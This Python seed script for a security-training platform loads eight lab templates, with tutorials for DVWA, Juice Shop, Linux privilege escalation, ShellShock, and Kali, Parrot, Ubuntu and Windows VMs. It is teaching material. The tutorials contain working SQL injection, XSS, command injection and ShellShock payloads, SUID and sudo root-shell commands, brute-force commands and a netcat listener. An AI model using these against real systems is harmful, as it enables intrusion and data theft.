"""
LearnForge — Seed lab templates into the database.
Run: python -m scripts.seed_labs
"""

from __future__ import annotations

import sys
from pathlib import Path

# Add project root to path
sys.path.insert(0, str(Path(__file__).resolve().parents[1]))

from sqlalchemy import create_engine, select, text
from sqlalchemy.orm import Session

from app.config import get_settings
from app.database import Base

# Import ALL models BEFORE create_all so all tables are registered with Base
import app.models  # noqa: F401  — registers users, paths, etc.
from app.labs.models import LabCategory, LabDifficulty, LabProtocol, LabTemplate


def main():
    settings = get_settings()
    engine = create_engine(settings.DATABASE_URL_SYNC, echo=False)

    # Ensure tables exist (lab models already imported above)
    Base.metadata.create_all(engine)

    templates = [
        # ── 1. DVWA (Web Hacking — Beginner) ──────────────────
        {
            "name": "Damn Vulnerable Web Application",
            "slug": "dvwa",
            "docker_image": "vulnerables/web-dvwa",
            "protocol": LabProtocol.web,
            "internal_port": 80,
            "default_credentials": {"username": "admin", "password": "password"},
            "difficulty": LabDifficulty.beginner,
            "category": LabCategory.web_hacking,
            "description": "A deliberately insecure PHP/MySQL web application for practising common web exploits like SQL injection, XSS, file inclusion, and CSRF.",
            "icon": "🌐",
            "xp_reward": 150,
            "tutorial_markdown": DVWA_TUTORIAL,
        },
        # ── 2. OWASP Juice Shop (Web Hacking — All Levels) ────
        {
            "name": "OWASP Juice Shop",
            "slug": "juice-shop",
            "docker_image": "bkimminich/juice-shop",
            "protocol": LabProtocol.web,
            "internal_port": 3000,
            "default_credentials": {},
            "difficulty": LabDifficulty.intermediate,
            "category": LabCategory.web_hacking,
            "description": "An intentionally insecure Node.js web store covering the entire OWASP Top 10 and beyond. Features a built-in score board to track solved challenges.",
            "icon": "🧃",
            "xp_reward": 200,
            "tutorial_markdown": JUICE_SHOP_TUTORIAL,
        },
        # ── 3. Vuln-SSH (Linux Priv-Esc — Beginner) ───────────
        {
            "name": "Linux Privilege Escalation",
            "slug": "vuln-ssh",
            "docker_image": "learnforge/vuln-ssh:latest",
            "protocol": LabProtocol.ssh,
            "internal_port": 22,
            "default_credentials": {"username": "hacker", "password": "hacker123"},
            "difficulty": LabDifficulty.beginner,
            "category": LabCategory.privilege_escalation,
            "description": "SSH into a misconfigured Linux server and escalate from a regular user to root. Practise SUID exploitation, sudo abuse, and cron-based privilege escalation.",
            "icon": "🔑",
            "xp_reward": 250,
            "tutorial_markdown": VULN_SSH_TUTORIAL,
        },
        # ── 4. ShellShock CVE-2014-6271 ───────────────────────────────────
        {
            "name": "ShellShock (CVE-2014-6271)",
            "slug": "shellshock",
            "docker_image": "learnforge/shellshock:latest",
            "protocol": LabProtocol.ssh,
            "internal_port": 22,
            "default_credentials": {"username": "hacker", "password": "shellshock"},
            "difficulty": LabDifficulty.intermediate,
            "category": LabCategory.cve_exploitation,
            "description": "Exploit the notorious Bash ShellShock vulnerability. SSH into the target server and craft custom HTTP requests with malicious headers to achieve remote code execution via CGI.",
            "icon": "💥",
            "xp_reward": 300,
            "tutorial_markdown": SHELLSHOCK_TUTORIAL,
        },
        # ── 5. Parrot OS VM (Official Browser VM) ─────────────
        {
            "name": "Parrot OS Security VM",
            "slug": "parrot-os",
            "docker_image": "learnforge/parrot-os:latest",
            "protocol": LabProtocol.novnc,
            "internal_port": 8006,
            "default_credentials": {"username": "parrot", "password": "parrot"},  # Common first-login credentials for official prebuilt Parrot VMs
            "difficulty": LabDifficulty.intermediate,
            "category": LabCategory.vm,
            "description": "Official Parrot Security 7.1 virtual machine — a full security distro that ships with ALL major pentesting tools out of the box. Includes Metasploit, Nmap, Burp Suite, Wireshark, Aircrack-ng, SQLmap, Hashcat, John, Gobuster, Nikto, Recon-ng, theHarvester, Impacket, Evil-WinRM, Bettercap, Proxychains, Tor, and hundreds more. A complete offensive security workstation delivered through the browser.",
            "icon": "🦜",
            "xp_reward": 0,
            "tutorial_markdown": PARROT_OS_TUTORIAL,
        },
        # ── 6. Kali Linux VM ──────────────────────────────────
        {
            "name": "Kali Linux VM",
            "slug": "kali-linux",
            "docker_image": "learnforge/kali-linux:latest",
            "protocol": LabProtocol.novnc,
            "internal_port": 6080,
            "default_credentials": {"username": "kali", "password": "kali123"},
            "difficulty": LabDifficulty.intermediate,
            "category": LabCategory.vm,
            "description": "Full Kali Linux desktop with the complete penetration testing toolset. Includes all major tool categories: reconnaissance, web application testing, exploitation frameworks, password attacks, wireless auditing, OSINT, post-exploitation, network analysis, and anonymity tools. The definitive environment for red team exercises, CTFs, and security research.",
            "icon": "🐉",
            "xp_reward": 0,
            "tutorial_markdown": KALI_TUTORIAL,
        },
        # ── 7. Ubuntu Desktop VM ──────────────────────────────
        {
            "name": "Ubuntu Desktop VM",
            "slug": "ubuntu-desktop",
            "docker_image": "learnforge/ubuntu-desktop:latest",
            "protocol": LabProtocol.novnc,
            "internal_port": 6080,
            "default_credentials": {"username": "ubuntu", "password": "ubuntu123"},
            "difficulty": LabDifficulty.beginner,
            "category": LabCategory.vm,
            "description": "Ubuntu 22.04 GNOME desktop configured as a combined development and security learning environment. Pre-loaded with Python 3, Node.js, Git, GCC, and common dev tools alongside networking and security utilities like nmap, netcat, Wireshark, and tcpdump. Ideal for scripting, tool development, and introductory security exercises.",
            "icon": "🐧",
            "xp_reward": 0,
            "tutorial_markdown": UBUNTU_DESKTOP_TUTORIAL,
        },
        # ── 8. Windows 11 VM ──────────────────────────────────
        {
            "name": "Windows 11 VM",
            "slug": "windows11",
            "docker_image": "learnforge/windows11:latest",
            "protocol": LabProtocol.novnc,
            "internal_port": 8006,
            "default_credentials": {"username": "User", "password": ""},
            "difficulty": LabDifficulty.intermediate,
            "category": LabCategory.vm,
            "description": "Windows 11 Enterprise (WinDev Eval) desktop running via QEMU inside Docker. Boots in ~30 seconds from a pre-installed snapshot. Each session is fully ephemeral — all changes are discarded on stop. Great for Windows security research and malware analysis.",
            "icon": "🪟",
            "xp_reward": 0,
            "tutorial_markdown": WINDOWS11_TUTORIAL,
        },
    ]

    with Session(engine) as db:
        for tmpl_data in templates:
            existing = db.execute(
                select(LabTemplate).where(LabTemplate.slug == tmpl_data["slug"])
            ).scalar_one_or_none()

            if existing:
                # Upsert: update all fields so re-seeding picks up changes
                for key, value in tmpl_data.items():
                    setattr(existing, key, value)
                print(f"  🔄 Updated lab template: {tmpl_data['name']}")
            else:
                lab_template = LabTemplate(**tmpl_data)
                db.add(lab_template)
                print(f"  ✅ Created lab template: {tmpl_data['name']}")

        db.commit()

    print("🧪 Lab seeding complete.")


# ═══════════════════════════════════════════════════════════════
# Tutorials (Markdown)
# ═══════════════════════════════════════════════════════════════

DVWA_TUTORIAL = """# Damn Vulnerable Web Application (DVWA)

## Overview
DVWA is a PHP/MySQL web application that is intentionally vulnerable. It helps security professionals test their skills and tools in a legal environment.

---

## Step 1 — Login to DVWA
Open the web application in the frame on the right. Use the default credentials:
- **Username:** `admin`
- **Password:** `password`

## Step 2 — Set the Security Level
After logging in, click **DVWA Security** in the left menu. Set the security level to **Low** to start.

## Step 3 — SQL Injection
1. Navigate to **SQL Injection** from the left menu.
2. In the User ID field, enter: `1' OR '1'='1`
3. Click **Submit** — you should see all user records dumped.
4. **Why it works:** The application concatenates your input directly into an SQL query without sanitization.

## Step 4 — Reflected XSS
1. Navigate to **XSS (Reflected)**.
2. In the name field, enter: `<script>alert('XSS')</script>`
3. Click **Submit** — you should see an alert popup.
4. **Why it works:** Your input is reflected back into the page without encoding.

## Step 5 — Command Injection
1. Navigate to **Command Injection**.
2. Enter an IP address followed by: `; cat /etc/passwd`
3. Click **Submit** — the server's passwd file should appear.
4. **Why it works:** The app passes input to a shell command without sanitization.

## Step 6 — File Inclusion
1. Navigate to **File Inclusion**.
2. Modify the URL `page` parameter to: `../../etc/passwd`
3. You should see the contents of `/etc/passwd`.

## Step 7 — CSRF
1. Navigate to **CSRF**.
2. Open your browser dev tools → Network tab.
3. Change the password and observe how the request has no anti-CSRF token.
4. Craft a URL that changes the password when visited.

## Step 8 — Increase Difficulty
Go back to **DVWA Security** and set it to **Medium**, then **High**. Try the same attacks — notice how additional protections are added, and learn how to bypass them.

---

## 🏁 Completion
You've explored the core OWASP vulnerabilities in a safe environment. Understanding *why* each attack works is the key to defending against them.
"""

JUICE_SHOP_TUTORIAL = """# OWASP Juice Shop

## Overview
Juice Shop is a modern, intentionally insecure web application written in Node.js/Angular. It contains over **100 hacking challenges** covering the entire OWASP Top 10.

---

## Step 1 — Explore the Application
Open Juice Shop in the frame. Browse around like a normal user — view products, read reviews, and try the search.

## Step 2 — Find the Score Board
The Score Board is hidden. Try to find it:
- **Hint:** Look at the JavaScript source. Search for route definitions.
- **URL:** Try navigating to `/#/score-board`

## Step 3 — SQL Injection Login Bypass
1. Go to the **Login** page.
2. In the email field, enter: `' OR 1=1--`
3. Use any password.
4. You should be logged in as the admin user!

## Step 4 — XSS via Search
1. Use the search bar at the top.
2. Enter: `<iframe src="javascript:alert('xss')">`
3. Observe the reflected XSS in the search results page.

## Step 5 — Access Admin Section
1. After logging in as admin (Step 3), try navigating to `/#/administration`.
2. You now have access to the admin panel with user management capabilities.

## Step 6 — Sensitive Data Exposure
1. Check the **About** page source code.
2. Look for references to confidential files.
3. Try accessing `/ftp/` — you'll find backup files with sensitive data.

## Step 7 — Broken Access Control
1. Place an order as a regular user.
2. Intercept the request and change the user ID in the basket.
3. You can view and modify other users' baskets.

## Step 8 — Check Your Progress
Visit the **Score Board** (`/#/score-board`) to see which challenges you've completed. Try to solve at least 10 challenges across different categories.

---

## 🏁 Completion
Juice Shop is a challenge-based environment — the more you explore, the more you learn. Use browser dev tools, Burp Suite, or curl to dig deeper.
"""

VULN_SSH_TUTORIAL = """# Linux Privilege Escalation Lab

## Overview
You have SSH access to a misconfigured Linux server as user `hacker`. Your goal: **escalate to root** and capture both flags.

---

## Step 1 — Connect via SSH
The terminal on the right is connected to the lab. You're logged in as `hacker`.

Credentials:
- **Username:** `hacker`
- **Password:** `hacker123`

## Step 2 — Capture the User Flag
```bash
cat ~/user.txt
```
Record the flag: `FLAG{user_shell_obtained}`

## Step 3 — Enumerate the System
Start by gathering information:
```bash
id
uname -a
cat /etc/os-release
sudo -l
```

## Step 4 — Find SUID Binaries
SUID binaries run with their owner's permissions. Look for unusual ones:
```bash
find / -perm -4000 -type f 2>/dev/null
```
Notice that `find` and `python3` have the SUID bit set.

## Step 5 — Privilege Escalation via SUID find
The `find` command with SUID can execute commands as root:
```bash
find . -exec /bin/sh -p \\;
```
Check your privileges:
```bash
whoami
```
You should be root!

## Step 6 — Alternative: SUID python3
If you prefer Python:
```bash
python3 -c 'import os; os.execl("/bin/sh", "sh", "-p")'
```

## Step 7 — Alternative: sudo vim
Check what you can run with sudo:
```bash
sudo -l
```
You can run `vim` as root without a password:
```bash
sudo vim -c '!sh'
```

## Step 8 — Capture the Root Flag
As root:
```bash
cat /root/root.txt
```
Record the flag: `FLAG{root_privilege_escalated}`

---

## 🏁 Completion
You've successfully escalated privileges using SUID binaries and sudo misconfigurations. In a real penetration test, these are among the most common Linux privilege escalation vectors.

### Further Reading
- [GTFOBins](https://gtfobins.github.io/) — Curated list of Unix binaries that can be exploited for privilege escalation
- [LinPEAS](https://github.com/carlospolop/PEASS-ng) — Automated enumeration script
"""

SHELLSHOCK_TUTORIAL = """# ShellShock (CVE-2014-6271)

## Overview
ShellShock is a critical vulnerability in GNU Bash (versions through 4.3) that allows remote code execution through environment variables. When a CGI script runs via Bash, an attacker can inject commands through HTTP headers.

This lab gives you **SSH access** to the target server so you can craft and send requests directly. The **web preview panel** below the terminal lets you see the target web application.

---

## Credentials
- **Username:** `hacker`
- **Password:** `shellshock`

---

## Step 1 — Explore the Target in the Web Preview
Look at the **web preview panel** below the terminal. You should see a simple web page served by Apache with CGI enabled.

Note the CGI endpoint at `/cgi-bin/vulnerable`.

## Step 2 — Understand the Vulnerability
ShellShock exploits Bash's function export feature. When Bash processes an environment variable containing a function definition, it **executes any trailing commands**:
```bash
() { ignored; }; /bin/command
```
In a CGI context, HTTP headers become environment variables (e.g., `HTTP_USER_AGENT`).

## Step 3 — Test for ShellShock
From the terminal, send a malicious User-Agent header:
```bash
curl -A "() { :; }; echo; echo vulnerable" http://localhost/cgi-bin/vulnerable
```
If you see `vulnerable` in the response, the server is affected.

## Step 4 — Extract System Information
```bash
curl -A "() { :; }; echo; /bin/cat /etc/passwd" http://localhost/cgi-bin/vulnerable
```
You should see the contents of `/etc/passwd`.

## Step 5 — Try Different Headers
ShellShock works through any header that becomes an environment variable:
```bash
# Via Referer header
curl -e "() { :; }; echo; /usr/bin/id" http://localhost/cgi-bin/vulnerable

# Via custom header
curl -H "X-Custom: () { :; }; echo; /bin/ls -la /root" http://localhost/cgi-bin/vulnerable
```

## Step 6 — Enumerate the System
```bash
curl -A "() { :; }; echo; /usr/bin/id" http://localhost/cgi-bin/vulnerable
curl -A "() { :; }; echo; /bin/ls -la /" http://localhost/cgi-bin/vulnerable
curl -A "() { :; }; echo; /bin/cat /etc/os-release" http://localhost/cgi-bin/vulnerable
```

## Step 7 — Capture the Web Flag
```bash
curl -A "() { :; }; echo; /bin/cat /var/www/flag.txt" http://localhost/cgi-bin/vulnerable
```

## Step 8 — Escalate to Read Root Flag
The root flag requires privilege escalation. Try:
```bash
curl -A "() { :; }; echo; /bin/cat /root/flag.txt" http://localhost/cgi-bin/vulnerable
```
Does the CGI script run as root? Check `whoami`:
```bash
curl -A "() { :; }; echo; /usr/bin/whoami" http://localhost/cgi-bin/vulnerable
```

## Step 9 — Understanding the Fix
The fix involves updating Bash to a patched version. Check the vulnerable version:
```bash
curl -A "() { :; }; echo; /usr/local/bin/bash-vuln --version" http://localhost/cgi-bin/vulnerable
```

---

## 🏁 Completion
You've exploited one of the most impactful vulnerabilities in recent history. ShellShock affected millions of servers and IoT devices. Understanding it teaches you about the dangers of trusting user input in any form — even HTTP headers.

### CVE Details
- **CVE:** CVE-2014-6271
- **CVSS:** 10.0 (Critical)
- **Affected:** GNU Bash through 4.3
- **Discovered:** September 2014
"""

PARROT_OS_TUTORIAL = """# Parrot OS Security VM

This lab launches an **official Parrot Security 7.1 virtual machine** — a full security distro that ships with ALL major pentesting tools out of the box. The desktop is streamed through your browser.

Unlike lightweight container labs, this is a real VM with a full desktop boot flow and VM-style startup behaviour.

## Getting Started

- Open the browser console above and give the VM a little time to finish booting.
- VM-backed labs take longer to cold-start or reboot than container-only labs.
- You do not need SSH for day-to-day use; interact with the desktop session in the browser.

## Login Guidance

| Field | Value |
|-------|-------|
| Username | `parrot` |
| Password | `parrot` |

If this specific image has been updated or asks you to complete a first-run step, follow the credentials or prompts shown inside the VM itself.

## Opening a Terminal

Open a terminal from the Parrot application menu or the desktop/taskbar. Most tools are accessible from the command line or the categorised application menus.

---

## Tool Categories

### 🔍 Reconnaissance
| Tool | Usage |
|------|-------|
| nmap | `nmap -sV -sC -oN scan.txt TARGET` |
| masscan | `masscan -p1-65535 TARGET --rate=1000` |
| dnsrecon | `dnsrecon -d example.com` |
| fierce | `fierce --domain example.com` |
| theharvester | `theHarvester -d example.com -b all` |
| recon-ng | `recon-ng` (interactive recon framework) |

### 🌐 Web Application Testing
| Tool | Usage |
|------|-------|
| burpsuite | Launch from Applications → Web Application Analysis |
| nikto | `nikto -h http://TARGET` |
| gobuster | `gobuster dir -u http://TARGET -w /usr/share/wordlists/dirb/common.txt` |
| dirb | `dirb http://TARGET /usr/share/wordlists/dirb/common.txt` |
| sqlmap | `sqlmap -u "http://TARGET?id=1" --batch` |
| wfuzz | `wfuzz -c -w wordlist.txt http://TARGET/FUZZ` |
| wafw00f | `wafw00f http://TARGET` |
| whatweb | `whatweb http://TARGET` |

### 🔓 Exploitation
| Tool | Usage |
|------|-------|
| metasploit | `msfconsole` |
| searchsploit | `searchsploit apache 2.4` |
| impacket | `impacket-psexec user:pass@TARGET` |
| impacket-smbexec | `impacket-smbexec user:pass@TARGET` |

### 🔑 Password Attacks
| Tool | Usage |
|------|-------|
| hydra | `hydra -l user -P wordlist TARGET ssh` |
| medusa | `medusa -h TARGET -u user -P wordlist -M ssh` |
| john | `john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt` |
| hashcat | `hashcat -m 0 hash.txt wordlist.txt` |
| crunch | `crunch 8 8 -o wordlist.txt` |
| cewl | `cewl http://TARGET -w custom-wordlist.txt` |

Wordlists: `/usr/share/wordlists/` — Extract rockyou: `gunzip /usr/share/wordlists/rockyou.txt.gz`

### 📶 Wireless
| Tool | Usage |
|------|-------|
| aircrack-ng | `aircrack-ng capture.cap -w wordlist.txt` |
| reaver | `reaver -i wlan0mon -b BSSID -vv` |
| bettercap | `bettercap -iface eth0` |

### 🔎 OSINT
| Tool | Usage |
|------|-------|
| theharvester | `theHarvester -d example.com -b google,bing` |
| recon-ng | `recon-ng` |
| dnsrecon | `dnsrecon -d example.com -t std` |

### 🖥️ Post-Exploitation
| Tool | Usage |
|------|-------|
| evil-winrm | `evil-winrm -i TARGET -u user -p pass` |
| smbclient | `smbclient //TARGET/share -U user` |
| smbmap | `smbmap -H TARGET -u user -p pass` |
| enum4linux | `enum4linux -a TARGET` |

### 📡 Network Analysis
| Tool | Usage |
|------|-------|
| wireshark | Launch from Applications → Sniffing & Spoofing |
| tcpdump | `tcpdump -i eth0 -w capture.pcap` |
| tshark | `tshark -i eth0 -f "port 80"` |
| netcat | `nc -lvnp 4444` |
| hping3 | `hping3 -S TARGET -p 80` |

### 🕶️ Anonymity & Tunnelling
| Tool | Usage |
|------|-------|
| proxychains | `proxychains nmap -sT TARGET` |
| tor | `service tor start` then use proxychains |

---

## Using This VM as Your Attack Machine

When the runtime attaches this VM to an exercise network, you can use it as your attack workstation against other running lab targets:

```bash
# Discover reachable lab targets
nmap -sV <target-subnet-or-ip-range>

# Full port scan with service/version detection
nmap -sV -sC -p- -oN full-scan.txt TARGET

# Web directory brute force
gobuster dir -u http://TARGET -w /usr/share/wordlists/dirb/common.txt

# SQL injection test
sqlmap -u "http://TARGET?id=1" --batch --dbs

# Start Metasploit for exploitation
msfconsole

# Password brute force via SSH
hydra -l admin -P /usr/share/wordlists/rockyou.txt TARGET ssh

# Probe a web target
curl -A "() { :; }; echo; id" http://<lab-ip>/cgi-bin/vulnerable

# Windows target enumeration
enum4linux -a TARGET
evil-winrm -i TARGET -u user -p pass
```

## Tips

- Expect the first screen draw and desktop login to take longer than container-backed labs
- If the VM shows a login prompt, use the credentials above
- Save anything important outside the VM before stopping the lab — lab state may be reset between runs
- Use `sudo parrot-upgrade` to update tools if needed
"""


KALI_TUTORIAL = """## Kali Linux VM

The complete penetration testing platform with the full Kali toolset pre-installed.

### Credentials
- **Username:** `kali`
- **Password:** `kali123`

### Clipboard
Use the **Paste to VM** button above to paste commands directly into the VM.

### Tool Categories

#### 🔍 Reconnaissance
| Tool | Usage |
|------|-------|
| nmap | `nmap -sV -sC -oN scan.txt TARGET` |
| masscan | `masscan -p1-65535 TARGET --rate=1000` |
| dnsrecon | `dnsrecon -d example.com` |
| fierce | `fierce --domain example.com` |
| theharvester | `theHarvester -d example.com -b all` |
| recon-ng | `recon-ng` (interactive framework) |

#### 🌐 Web Application Testing
| Tool | Usage |
|------|-------|
| burpsuite | Launch from Applications → Web Application Analysis |
| nikto | `nikto -h http://TARGET` |
| gobuster | `gobuster dir -u http://TARGET -w /usr/share/wordlists/dirb/common.txt` |
| sqlmap | `sqlmap -u "http://TARGET?id=1" --batch` |
| wfuzz | `wfuzz -c -w wordlist.txt http://TARGET/FUZZ` |
| wafw00f | `wafw00f http://TARGET` |
| whatweb | `whatweb http://TARGET` |
| dirb | `dirb http://TARGET /usr/share/wordlists/dirb/common.txt` |

#### 🔓 Exploitation
| Tool | Usage |
|------|-------|
| metasploit | `msfconsole` |
| searchsploit | `searchsploit apache 2.4` |
| impacket | `impacket-psexec user:pass@TARGET` |

#### 🔑 Password Attacks
| Tool | Usage |
|------|-------|
| hydra | `hydra -l user -P wordlist TARGET ssh` |
| medusa | `medusa -h TARGET -u user -P wordlist -M ssh` |
| john | `john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt` |
| hashcat | `hashcat -m 0 hash.txt wordlist.txt` |
| crunch | `crunch 8 8 -o wordlist.txt` |
| cewl | `cewl http://TARGET -w custom-wordlist.txt` |

Wordlists: `/usr/share/wordlists/` — Extract rockyou: `gunzip /usr/share/wordlists/rockyou.txt.gz`

#### 📶 Wireless
| Tool | Usage |
|------|-------|
| aircrack-ng | `aircrack-ng capture.cap -w wordlist.txt` |
| reaver | `reaver -i wlan0mon -b BSSID -vv` |
| bettercap | `bettercap -iface eth0` |

#### 🔎 OSINT & Forensics
| Tool | Usage |
|------|-------|
| theharvester | `theHarvester -d example.com -b google,bing` |
| dnsrecon | `dnsrecon -d example.com -t std` |
| maltego | Launch from Applications → Information Gathering |

#### 🖥️ Post-Exploitation
| Tool | Usage |
|------|-------|
| evil-winrm | `evil-winrm -i TARGET -u user -p pass` |
| smbclient | `smbclient //TARGET/share -U user` |
| smbmap | `smbmap -H TARGET -u user -p pass` |
| enum4linux | `enum4linux -a TARGET` |

#### 📡 Network Analysis
| Tool | Usage |
|------|-------|
| wireshark | Launch from Applications → Sniffing & Spoofing |
| tcpdump | `tcpdump -i eth0 -w capture.pcap` |
| tshark | `tshark -i eth0 -f "port 80"` |
| netcat | `nc -lvnp 4444` |
| hping3 | `hping3 -S TARGET -p 80` |

#### 🕶️ Anonymity & Tunnelling
| Tool | Usage |
|------|-------|
| proxychains | `proxychains nmap -sT TARGET` |
| tor | `service tor start` then use proxychains |

### Quick Start
```bash
# Start Metasploit
msfconsole

# Full port scan with service detection
nmap -sV -sC -p- -oN full-scan.txt TARGET

# Web directory brute force
gobuster dir -u http://TARGET -w /usr/share/wordlists/dirb/common.txt

# SQL injection test
sqlmap -u "http://TARGET?id=1" --batch --dbs

# Password brute force via SSH
hydra -l admin -P /usr/share/wordlists/rockyou.txt TARGET ssh
```
"""

UBUNTU_DESKTOP_TUTORIAL = """## Ubuntu Desktop VM

A development AND security learning environment built on Ubuntu 22.04 with the GNOME Shell desktop and Yaru theme.

### Credentials
- **Username:** `ubuntu`
- **Password:** `ubuntu123`

### Desktop
This is the standard Ubuntu GNOME Shell experience with the Ubuntu Dock,
Activities overview, and Yaru theme. Click **Activities** (top-left corner)
or press the **Super** key to search for applications.

### Clipboard
Use the **Paste to VM** button above to paste commands directly into the VM.

### Development Tools
| Tool | Usage |
|------|-------|
| Python 3 | `python3 --version` / `pip install <pkg>` |
| Node.js & npm | `node --version` / `npm init` |
| Git | `git clone https://github.com/example/repo.git` |
| GCC / Make | `gcc -o binary source.c` / `make` |
| vim / nano / gedit | Terminal and GUI editors |

### Security & Networking Tools
| Tool | Usage |
|------|-------|
| nmap | `nmap -sV TARGET` |
| netcat | `nc -lvnp 4444` |
| Wireshark | Launch from Applications or `wireshark` |
| tcpdump | `tcpdump -i eth0 -w capture.pcap` |
| curl / wget | `curl -v http://TARGET` |
| traceroute / dig | `traceroute TARGET` / `dig example.com` |

### Getting Started
```bash
# Check Python version
python3 --version

# Clone a repo
git clone https://github.com/example/repo.git

# Run a simple web server
python3 -m http.server 8080

# Scan the local network
nmap -sn 192.168.1.0/24

# Capture network traffic
sudo tcpdump -i eth0 -c 100 -w traffic.pcap
```

### Use Cases
- **Learn Linux fundamentals** — file system navigation, bash scripting, process management
- **Software development** — write, build, and debug code in Python, Node.js, or C
- **Networking basics** — packet capture, port scanning, DNS lookups
- **Security scripting** — build custom tools with Python and test them against lab targets
"""

WINDOWS11_TUTORIAL= """## Windows 11 VM

This VM runs a pre-installed **Windows 11 Enterprise** (WinDev Evaluation) snapshot via QEMU/KVM. Each session boots in ~30 seconds and is fully ephemeral — all changes are wiped on stop.

### Credentials
- **Username:** `User`
- **Password:** *(none — auto-login)*

### Requirements
- Host must have KVM enabled (`/dev/kvm`)
- Minimum 4GB RAM allocated

### Access
Connect via the noVNC browser interface above. RDP is also available on port 3389.

### Tips
- Use the clipboard toolbar to paste commands into the VM
- The desktop auto-logs in as `User` — no password needed
- All changes are discarded when the session ends (ephemeral overlay)
- Windows Defender may flag pentest tools — disable it if needed for lab work
"""


if __name__ == "__main__":
    main()
